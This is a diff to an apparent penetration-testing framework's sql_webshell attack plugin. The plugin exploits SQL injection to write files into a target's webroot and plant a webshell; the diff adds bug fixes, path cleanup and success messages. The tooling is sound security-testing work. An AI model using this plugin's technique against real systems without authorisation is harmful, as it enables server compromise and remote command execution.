@@ -179,7 +179,7 @@ class sql_webshell(baseAttackPlugin):
                 om.out.debug('Verifying vulnerability in URL: "' + v.getURL() + '".')
                 vuln_obj = bsql.is_injectable( v.getMutant().getFuzzableReq(), v.getVar() )
                 if vuln_obj:
-                    tmp_vuln_list.extend( vuln_obj )
+                    tmp_vuln_list.append( vuln_obj )
             
             # Ok, go to the next stage with the filtered vulnerabilities
             vulns = tmp_vuln_list
@@ -227,7 +227,10 @@ class sql_webshell(baseAttackPlugin):
                 shell_obj = mysql_web_shell( vuln_obj )
                 shell_obj.setUrlOpener( self._urlOpener )
                 shell_obj.setWebShellURL( webshell_url )
-            return shell_obj
+                return shell_obj
+            else:
+                # Sad face :(
+                return None
     
     def _upload_webshell(self, driver, vuln_obj):
         '''
@@ -257,6 +260,8 @@ class sql_webshell(baseAttackPlugin):
                 # Create the filename
                 remote_filename = createRandAlNum( 8 ) + '.' + createRandAlNum(3)
                 remote_path += '/' + remote_filename
+                # And just in case... remove double slashes
+                for i in xrange(3): remote_path = remote_path.replace('//', '/')
                 
                 # Create the content (which will also act as the test_string)
                 test_string = content = createRandAlNum(16)
@@ -266,6 +271,7 @@ class sql_webshell(baseAttackPlugin):
             
                 if self._upload_file( driver, remote_path, content, test_url, test_string):
                     upload_success = True
+                    om.out.console('Successfully wrote a file to the webroot.')
                     break
         
         # We can upload files, and we know where they are uploaded, now we
@@ -290,6 +296,7 @@ class sql_webshell(baseAttackPlugin):
                 # Upload & test
                 if self._upload_file( driver, remote_path, file_content, test_url, payloads.SHELL_IDENTIFIER):
                     # Complete success!
+                    om.out.console('Successfully executed a webshell in the target server!')
                     return test_url
                     
         return None
@@ -303,14 +310,20 @@ class sql_webshell(baseAttackPlugin):
         
         @return: True if the file was uploaded.
         '''
+        msg = 'Writing "' + content + '" to "' + remote_path +'" and searching it at: "'
+        msg += test_url +'".'
+        om.out.debug( msg )
+        
         try:
             driver.writeFile( remote_path , content )
             response = self._urlOpener.GET( test_url )
-        except:
-            return False
+        except Exception, e:
+            raise e
         else:
             if test_string in response.getBody():
                 return True
+            else:
+                return False
     
     def _get_site_directories(self):
         '''
